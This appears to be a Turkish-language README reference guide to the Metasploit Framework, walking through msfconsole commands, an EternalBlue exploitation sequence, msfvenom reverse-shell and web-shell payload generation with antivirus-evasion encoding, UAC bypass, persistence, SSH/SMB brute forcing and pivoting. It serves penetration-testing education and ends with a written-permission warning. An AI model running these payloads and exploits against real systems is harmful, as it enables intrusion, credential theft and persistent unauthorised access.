# 🔴 Metasploit Framework - Kapsamlı Başvuru Kılavuzu

[🇬🇧 English](../../README.md)

```
                                   ___          ____
                               ,-""   `.      < HACK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _.--.__    /   ;
 (`._    _.-""       "--'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'
```

![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge&logo=metasploit)
![Kali Linux](https://img.shields.io/badge/Kali-Linux-557C94?style=for-the-badge&logo=kalilinux&logoColor=white)
![Offensive Security](https://img.shields.io/badge/Offensive-Security-red?style=for-the-badge)
![License](https://img.shields.io/badge/License-BSD--3-green?style=for-the-badge)

> **Dünyanın en yaygın kullanılan sızma testi platformu** - Metasploit Framework'te uzmanlaşmak için eksiksiz rehberiniz

---

## 📋 İçindekiler

- [Giriş](#-giriş)
- [Kurulum](#-kurulum)
- [Mimari Genel Bakış](#-mimari-genel-bakış)
- [Metasploit'i Başlatma](#-metasploiti-başlatma)
- [Temel Komutlar](#-temel-komutlar)
- [Modül Türleri](#-modül-türleri)
- [İstismar (Exploitation) İş Akışı](#-istismar-exploitation-iş-akışı)
- [Veritabanı Entegrasyonu (PostgreSQL)](#-veritabanı-entegrasyonu-postgresql)
- [Tarama ve Numaralandırma (Scanning & Enumeration)](#-tarama-ve-numaralandırma-scanning--enumeration)
- [Payload Üretimi (msfvenom)](#-payload-üretimi-msfvenom)
- [Sömürü Sonrası (Post-Exploitation)](#-sömürü-sonrası-post-exploitation)
- [Yardımcı Modüller (Auxiliary)](#-yardımcı-modüller-auxiliary)
- [Gerçek Dünya Örnek Senaryoları](#-gerçek-dünya-örnek-senaryoları)
- [Hızlı Başvuru Tabloları](#-hızlı-başvuru-tabloları)
- [İpuçları ve En İyi Uygulamalar](#-ipuçları-ve-en-iyi-uygulamalar)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş

**Metasploit Framework**, açık kaynaklı bir sızma testi, zafiyet doğrulama ve exploit geliştirme platformudur. Temel olarak şu yetenekleri sağlar:

- 🔍 **Bilgi Toplama:** Ağ keşfi ve zafiyet taraması
- 💉 **İstismar (Exploit):** Geliştirilmiş ve test edilmiş güvenilir exploit kütüphanesi
- 🎭 **Payload Üretimi:** Çeşitli mimariler ve işletim sistemleri için saldırı yükleri
- 🔐 **Sömürü Sonrası (Post-Exploitation):** Yetki yükseltme, parola hash dökümü, pivoting ve kalıcılık
- 📊 **Raporlama:** Veritabanı ile tüm keşif ve zafiyet verilerini kayıt altına alma

### Temel Bileşenler

| Bileşen | Açıklama |
|---------|----------|
| `msfconsole` | Ana etkileşimli komut satırı arayüzü |
| `msfvenom` | Bağımsız saldırı yükü üreticisi ve kodlayıcısı (encoder) |
| `msfdb` | PostgreSQL veritabanı yönetim aracı |
| `msfrpcd` | Uzaktan erişim ve otomasyon için RPC arka plan servisi |

---

## 📥 Kurulum

### Kali Linux (Ön Yüklü Gelir)
```bash
# Metasploit paketini güncelleme
sudo apt update && sudo apt install metasploit-framework
```

### Ubuntu / Debian
```bash
# Bağımlılıkları yükleme
sudo apt install curl gnupg2 software-properties-common

# Metasploit kurulum betiğini indirme ve çalıştırma
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod 755 msfinstall
./msfinstall
```

### Docker
```bash
docker pull metasploitframework/metasploit-framework
docker run --rm -it metasploitframework/metasploit-framework ./msfconsole
```

---

## 🏗️ Mimari Genel Bakış

```
┌─────────────────────────────────────────────────────────────┐
│                    METASPLOIT FRAMEWORK                      │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ EXPLOITS │  │ PAYLOADS │  │AUXILIARY │  │   POST   │    │
│  │  (~2000) │  │  (~500)  │  │  (~1000) │  │  (~400)  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │ ENCODERS │  │   NOPS   │  │ EVASION  │  │ PLUGINS  │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
│                                                              │
├─────────────────────────────────────────────────────────────┤
│                     ARAYÜZLER                                │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐    │
│  │msfconsole│  │ Armitage │  │   API    │  │   RPC    │    │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘    │
├─────────────────────────────────────────────────────────────┤
│                 VERİTABANI (PostgreSQL)                      │
└─────────────────────────────────────────────────────────────┘
```

### Dizin Yapısı
```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/      # Güvenlik açığı istismar modülleri
│   ├── payloads/      # Hedefte çalışacak saldırı yükleri
│   ├── auxiliary/     # Tarayıcılar, fuzzing, DoS, sniffing
│   ├── post/          # Sömürü sonrası modüller
│   ├── encoders/      # Antivirüs atlatma ve karakter temizleme kodlayıcıları
│   ├── nops/          # Bellek hizalama NOP kızakları
│   └── evasion/       # AV atlatma modülleri
├── tools/             # Yardımcı betikler ve analiz araçları
├── scripts/           # Meterpreter betikleri
├── data/              # Kelime listeleri, şablonlar
└── plugins/           # Konsol eklentileri
```

---

## 🚀 Metasploit'i Başlatma

### Veritabanını Başlatma (İlk Kurulum)
```bash
# PostgreSQL servisini başlatın
sudo systemctl start postgresql

# Metasploit veritabanını yapılandırın
sudo msfdb init

# Durumu kontrol edin
sudo msfdb status
```

### msfconsole Çalıştırma
```bash
# Standart başlatma
msfconsole

# Sessiz mod (banner olmadan hızlı açılış)
msfconsole -q

# Başlangıçta doğrudan komut çalıştırma
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.100"

# Kaynak (.rc) dosyasından komutları yükleme
msfconsole -r commands.rc
```

---

## ⌨️ Temel Komutlar

### Gezinme ve Yardım

| Komut | Açıklama |
|-------|----------|
| `help` veya `?` | Genel yardım menüsünü görüntüler |
| `help <komut>` | Belirli bir komutun yardımını gösterir |
| `search <terim>` | İsim, CVE veya platforma göre modül arar |
| `use <modül>` | Belirtilen modülü aktif eder |
| `back` | Aktif modülden çıkıp ana menüye döner |
| `info` | Aktif modül hakkında detaylı bilgi verir |
| `show options` | Modülün zorunlu ve isteğe bağlı parametrelerini listeler |
| `show advanced` | Gelişmiş ayarları gösterir |
| `show payloads` | Seçili exploit ile uyumlu payload'ları listeler |
| `show targets` | Desteklenen hedef işletim sistemi ve mimarileri gösterir |

### Modül Parametrelerini Ayarlama

```bash
# Parametre atama
set RHOSTS 192.168.1.100          # Hedef IP veya alt ağ
set RPORT 445                      # Hedef port
set LHOST 192.168.1.50            # Kendi IP adresiniz (dinleyici)
set LPORT 4444                     # Kendi dinleme portunuz
set PAYLOAD windows/meterpreter/reverse_tcp

# Genel/Global parametre atama (modüller arası korunur)
setg RHOSTS 192.168.1.100
setg LHOST 192.168.1.50

# Parametreyi sıfırlama
unset RHOSTS
unsetg LHOST

# Geçerli ayarları kontrol etme
show options
check                              # Hedefin gerçekten zafiyetli olup olmadığını test eder
```

### Çalıştırma ve Oturum Yönetimi

```bash
# İstismarı başlatma
exploit
run

# Arka planda iş (job) olarak çalıştırma
exploit -j

# Başarı durumunda hemen oturuma geçmeme
exploit -z

# Açık oturumları listeleme
sessions
sessions -l

# Belirli bir oturuma bağlanma
sessions -i 1

# Oturumu sonlandırma
sessions -k 1

# Tüm oturumları sonlandırma
sessions -K

# Standart kabuğu Meterpreter'a yükseltme
sessions -u 1

# Tüm oturumlarda topluca komut çalıştırma
sessions -c "sysinfo"
```

---

## 📦 Modül Türleri

### 1. Exploits (İstismar Modülleri)
Hedef sistemdeki belirli bir güvenlik açığından yararlanarak kod çalıştırılmasını sağlar.
```bash
search type:exploit platform:windows
use exploit/windows/smb/ms17_010_eternalblue
```

### 2. Payloads (Saldırı Yükleri)
Hedef sistem ele geçirildikten hemen sonra arka planda çalıştırılacak koddur.
- **Singles:** Kendi kendine yeten, bağımsız küçük payload'lar (ör. adduser, execute cmd).
- **Stagers:** Hedefte çok küçük bir bağlantı kanalı açarak asıl büyük payload'ı (Meterpreter vb.) belleğe indirir.
- **Stages:** Stager tarafından belleğe yüklenen gelişmiş modüllerdir.

```bash
# Payload adlandırma standartları:
<platform>/<mimari>/<tür>/<bağlantı>
# Örnek: windows/x64/meterpreter/reverse_tcp
```

### 3. Auxiliary (Yardımcı Modüller)
Port tarama, servis sürüm tespiti, kaba kuvvet ve DoS gibi doğrudan exploit içermeyen test modülleri.
```bash
search type:auxiliary
use auxiliary/scanner/portscan/tcp
```

### 4. Post (Sömürü Sonrası Modüller)
Oturum elde edildikten sonra hassas bilgi toplama, parola dökümü ve ağ keşfi için kullanılır.
```bash
search type:post platform:windows
use post/windows/gather/hashdump
```

### 5. Encoders (Kodlayıcılar)
Payload'ları imza tabanlı antivirüs yazılımlarından ve kısıtlı karakter filtrelerinden (Bad Characters) korumak için dönüştürür.
```bash
show encoders
# Örnek: x86/shikata_ga_nai
```

---

## 🎯 İstismar (Exploitation) İş Akışı

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│   KEŞİF &    │───▶│    MODÜL     │───▶│  PARAMETRE   │
│ NUMARALANDIR │    │    SEÇİMİ    │    │  AYARLARI    │
└──────────────┘    └──────────────┘    └──────────────┘
                                                │
                                                ▼
┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│    SÖMÜRÜ    │◀───│   EXPLOIT    │◀───│   ZAFİYET    │
│   SONRASI    │    │  ÇALIŞTIRMA  │    │   KONTROLÜ   │
└──────────────┘    └──────────────┘    └──────────────┘
```

### Adım Adım Örnek İstismar
```bash
# 1. Modülü arayın
msf6 > search eternalblue

# 2. Modülü seçin
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 3. Seçenekleri inceleyin
msf6 exploit(ms17_010_eternalblue) > show options

# 4. Hedefi tanımlayın
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100

# 5. Uygun payload'ı seçin
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 6. Dinleyici IP ve portunu belirleyin
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

# 7. Zafiyeti doğrulayın
msf6 exploit(ms17_010_eternalblue) > check

# 8. Saldırıyı başlatın
msf6 exploit(ms17_010_eternalblue) > exploit
```

---

## 🗄️ Veritabanı Entegrasyonu (PostgreSQL)

### Çalışma Alanları (Workspace)
Projeleri ve hedefleri birbirinden izole etmek için workspace'ler kullanılır:
```bash
# Çalışma alanlarını listele
workspace

# Yeni çalışma alanı oluştur
workspace -a kurumsal_pentest

# Çalışma alanına geçiş yap
workspace kurumsal_pentest

# Çalışma alanını sil
workspace -d eski_proje
```

### Hedef ve Servis Yönetimi
```bash
# Keşfedilen makineleri listele
hosts

# Port ve servisleri listele
services

# Sadece HTTP/HTTPS servislerini filtrele
services -p 80,443

# Zafiyetleri listele
vulns
```

### Dışarıdan Tarama Alma (Import)
```bash
# Nmap XML tarama çıktısını içe aktarma
db_import /path/to/nmap_scan.xml

# Doğrudan veritabanına kayıt yapan Nmap taraması
db_nmap -sV -O 192.168.1.0/24
```

---

## 💉 Payload Üretimi (msfvenom)

### Temel Sözdizimi
```bash
msfvenom -p <PAYLOAD> <PARAMETRELER> -f <FORMAT> -o <ÇIKTI_DOSYASI>
```

### Sıkça Kullanılan msfvenom Parametreleri

| Parametre | Açıklama |
|-----------|----------|
| `-p` | Kullanılacak saldırı yükü (payload) |
| `-f` | Çıktı formatı (exe, elf, raw, asp, php, python vb.) |
| `-o` | Kaydedilecek dosya adı |
| `-e` | Kodlayıcı (encoder) |
| `-i` | Kodlama yineleme sayısı (iterations) |
| `-b` | Yasaklı karakterler (Bad characters, ör. '\x00\x0a') |
| `--platform` | Hedef işletim sistemi |
| `-a` | Hedef mimari (x86, x64, arm vb.) |

### Windows Payload'ları
```bash
# Standart Meterpreter (x86 EXE)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell.exe

# 64-Bit Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o shell64.exe

# Şifrelenmiş HTTPS Bağlantısı (Daha sessiz ve güvenli)
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.50 LPORT=443 -f exe -o shell_https.exe

# Kodlanmış Payload (Antivirüs atlatma denemesi)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded_shell.exe
```

### Linux ve Web Payload'ları
```bash
# Linux ELF (x64)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o shell.elf

# PHP Web Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o shell.php

# ASPX (IIS Sunucular İçin)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f aspx -o shell.aspx

# Java WAR Arşivi (Tomcat Uygulamaları)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f war -o shell.war
```

### Dinleyici (Multi/Handler) Başlatma
Ürettiğiniz ters bağlantı payload'larını karşılamak için msfconsole üzerinde dinleyici açın:
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 🔓 Sömürü Sonrası (Post-Exploitation)

### Yetki Yükseltme Önerici (Suggester)
```bash
# Sistemdeki yerel açıkları tarar
use post/multi/recon/local_exploit_suggester
set SESSION 1
run
```

### Windows UAC Atlatma ve SYSTEM Yetkisi Alma
```bash
# UAC atlatma
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
set PAYLOAD windows/meterpreter/reverse_tcp
exploit

# Doğrudan SYSTEM yetkisine yükselme
use post/windows/escalate/getsystem
```

### Kalıcılık Sağlama (Persistence)
```bash
# Servis tabanlı kalıcılık
use exploit/windows/local/persistence_service
set SESSION 1
run

# Zamanlanmış görev ile kalıcılık
use post/windows/manage/persistence_exe
set SESSION 1
set STARTUP SYSTEM
run
```

---

## 🔧 Yardımcı Modüller (Auxiliary)

### Ağ ve Parola Kaba Kuvveti (Brute Force)
```bash
# SSH Giriş Denemesi
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
set THREADS 10
run

# SMB Giriş Denemesi
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set SMBUser administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

## 🎬 Gerçek Dünya Örnek Senaryoları

### Senaryo 1: Ağ İçi Geçiş (Pivoting / Routing)
Ele geçirilen bir makine üzerinden doğrudan erişilemeyen iç ağları tarama:
```bash
# Meterpreter içinden rota ekleme
meterpreter > run autoroute -s 10.10.10.0/24

# Artık tüm Metasploit modülleri bu rota üzerinden iç ağa erişebilir
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 22,80,445
run
```

---

## 📊 Hızlı Başvuru Tabloları

### Temel Komutlar Özeti

| Komut | Açıklama |
|-------|----------|
| `search <kelime>` | Modül arama |
| `use <modül>` | Modülü seçme |
| `show options` | Parametreleri görüntüleme |
| `set <parametre> <değer>` | Parametre tanımlama |
| `exploit` / `run` | Modülü başlatma |
| `back` | Ana konsola dönme |
| `sessions -l` | Oturumları listeleme |
| `sessions -i <id>` | Oturuma bağlanma |

---

## 💡 İpuçları ve En İyi Uygulamalar

1. **Her Zaman PostgreSQL Kullanın:** `msfdb init` yaparak veritabanını aktif tutun; böylece taranan tüm servisler ve bulunan kimlik bilgileri otomatik indekslenir.
2. **Resource (.rc) Betiklerinden Yararlanın:** Sık tekrarladığınız dinleyici kurulumlarını bir `.rc` dosyasına kaydedip `msfconsole -r dosya.rc` ile tek hamlede başlatın.
3. **Thread Sayısına Dikkat Edin:** Tarama modüllerinde `THREADS` değerini çok yüksek tutmak hedef servisleri kilitleyebilir veya paket kaybına neden olabilir.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** Metasploit son derece güçlü ve tahrip edici olabilen bir siber saldırı ve test aracıdır. Yalnızca **yazılı izin alınmış sistemlerde** ve yasal sınırlar dahilinde kullanılmalıdır.

---

## 📚 Kaynaklar

- [Metasploit Resmi Dokümantasyonu](https://docs.metasploit.com/)
- [Rapid7 Araştırma Blogu](https://www.rapid7.com/blog/)
- [Meterpreter Kılavuzu](./Meterpreter.tr.md)

---

<p align="center">
  <b>🔴 Metasploit Platformunda Uzmanlaşın!</b><br>
  <i>Unutmayın: Büyük güç, büyük sorumluluk getirir</i>
</p>
